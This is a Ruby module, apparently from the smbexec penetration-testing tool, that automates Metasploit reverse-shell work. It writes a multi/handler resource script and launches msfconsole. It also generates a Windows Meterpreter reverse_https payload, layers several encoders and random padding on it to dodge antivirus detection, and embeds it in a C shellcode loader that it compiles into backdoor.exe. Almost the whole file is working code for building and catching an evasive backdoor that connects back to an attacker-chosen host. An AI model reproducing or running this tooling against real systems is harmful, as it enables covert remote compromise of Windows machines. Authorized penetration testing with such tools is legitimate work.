require 'utils'

module Lib_meta
	include Utils

	def get_meter_data(dns = false)
		 # Get valid lhost
		lhost = ''
		if dns
			while lhost.empty?
				print "Enter domain name (LHOST) [#{color_banner('EX: www.pentestgeek.com')}]:"
				lhost = rgets(' ')
			end
		else
			# Get local interface IP if routed to ip of first host in options
			if Menu.opts[:hosts]
				ip = local_ip(Menu.opts[:hosts][0])
			else
				ips = all_local_ips
				if ips.length.eql? 1
					ip = ips.join
				else
					puts "Local IP addresses: #{ips.join(', ')}"
					puts
					ip = ''
				end
			end
			
			until lhost.valid_ip?
				print "Enter local address (LHOST) [#{color_banner(ip)}]:"
				lhost = rgets(' ')
				lhost = ip if lhost.empty?
			end
		end
		# Get valid lport
		lport = 0
		until (1..65535).member? lport.to_i
			print "Enter listening port (LPORT) [#{color_banner('443')}]:"
			lport = rgets(' ')
			lport = 443 if lport.empty?
		end
		puts
		return lhost, lport
	end

	# Create RC script
	def create_rc(payload, lhost, lport)
		rc = "spool #{@log}/msf_spool_#{Time.now.strftime('%m-%d-%Y_%H-%M')}\n"
		#rc << "<ruby>\n"
		#rc << "sleep 3\n"
		#rc << "</ruby>\n"
		rc << "use exploit/multi/handler\n"
		rc << "set payload #{payload}\n"
		rc << "set LHOST #{lhost}\n"
		rc << "set LPORT #{lport}\n"
		rc << "set SessionCommunicationTimeout 600\n" if payload =~ /reverse_https/
		rc << "set ExitOnSession false\n"
		rc << "set InitialAutoRunScript migrate -f\n"
		rc << "set PrependMigrate true\n"
		rc << "exploit -j -z\n"

		begin
			File.open("#{@log}/rc", 'w') {|f| f.write(rc) }
		rescue => e
			print_bad("Error writting RC file: #{e}")
			return nil
		end

		print_status("Resource script created: #{@log}/rc")

		return "#{@log}/rc"
	end

	def create_handler(rc)
		# Quick check to see if xterm exists
		xterm = false
		xtermtest = `xterm -version`
		if xtermtest =~ /XTerm\(\d+\)/m and Menu.opts[:xterm]
			xterm = true
		end

		# Check if msfconsole exists
		msfconsoletest = `which msfconsole`
		if not msfconsoletest =~ /msfconsole/
			print_bad("msfconsole is not installed or missing from $PATH, quiting")
			return nil
		end

		if File.exists? rc
			if xterm 
				system("xterm -geometry -0+0 -T msfhandler -hold -e msfconsole -r #{rc} &")
			else
				# If not xterm, try putting shells in screens
				screen = "screen -dmS smbexec_msfhandler"
				system("#{screen} bash -c 'msfconsole -r #{rc}'")
			end
		else
			print_bad("Resource file doesn't seem to exist at #{rc}...")
		end
	end

	def build_payload(payload, lhost, lport)
		seed = Random.rand(10000 + 1)
		print_status("Building payload...")
		
		# Random number of numbers for all
		rand_array = []
		for i in 0..10000
			temp_array = [Random.rand(32767), i]
			rand_array << temp_array
		end
		rand_array.sort!

		nums = ''
		for i in 0..seed
			nums << "\"#{rand_array[i][1]}\"\n"
		end

		rand_array = []
		for i in 0..999999
			temp_array = [Random.rand(32767), i]
			rand_array << temp_array
		end
		rand_array.sort!

		nums2 = ''
		for i in 0..seed
			nums2 << "\"#{rand_array[i][1]}\"\n"
		end

		# Create msfpayload command
		build = "msfpayload #{payload} LHOST=#{lhost} LPORT=#{lport} "
		build << "SessionCommunicationTimeout=600 " if payload.eql? 'windows/meterpreter/reverse_https'
		enumber = Random.rand(15 + 3)
		build << "EXITFUNC=thread R |msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"
		enumber = Random.rand(15 + 3)		
		build << "msfencode -e x86/jmp_call_additive -c #{enumber} -t raw |"
		enumber = Random.rand(15 + 3)
		build << "msfencode -e x86/call4_dword_xor -c #{enumber} -t raw |"
		enumber = Random.rand(15 + 3)
		build << "msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"	
		enumber = Random.rand(15 + 3)
		build << "msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX"	
		
		# Execute and return payload
		capture_stderr('/dev/null') { build = `#{build}` }

		# Build C file
		frame = "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n"
		frame << "#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n"
		frame << "#include <windows.h>\nDWORD WINAPI exec_payload(LPVOID lpParameter)\n"
		frame << "{\n\tasm(\n\t\"movl %0, %%eax;\"\n\t\"call %%eax;\"\n\t:\n\t:\"r\""
		frame << "(lpParameter)\n\t:\"%eax\");\n\treturn 0;\n}\nvoid sys_bineval(char *argv)"
		frame << "\n{\n\tsize_t len;\n\tDWORD pID;\n\tchar *code;\n\tlen = (size_t)strlen(argv);"
		frame << "\n\tcode = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, "
		frame << "PAGE_EXECUTE_READWRITE);\n\tstrncpy(code, argv, len);\n\t"
		frame << "WaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID)"
		frame << ", INFINITE);\n}\n\nunsigned char ufs[]=\n#{nums};\nvoid main()\n{\n\tchar "
		frame << "*micro = \"#{build}\";\n\tsys_bineval(micro);\n\texit(0);\n}\nunsigned char "
		frame << "tap[]=\n#{nums2};\n"

		File.open("#{@log}/backdoor.c", 'w') { |file| file.write(frame) }

		mingw = "#{Menu.extbin[:mingw]} -Wall #{@log}/backdoor.c -o #{@log}/backdoor.exe"

		# Compile into exe
		capture_stderr('/dev/null') { compile = `#{mingw}`}
	
		if file_exists? ("#{@log}/backdoor.exe")
			print_status("Payload compiled: #{@log}/backdoor.exe")
			system("strip --strip-debug #{@log}/backdoor.exe")
			# Get a SHA1 hash of the file
			require 'digest'
			payload_hash = Digest::SHA1.hexdigest( File.read("#{@log}/backdoor.exe") )
		else
			print_bad("Could not compile binary...")
			return nil, nil
		end
		return "#{@log}/backdoor.exe", payload_hash
	end
end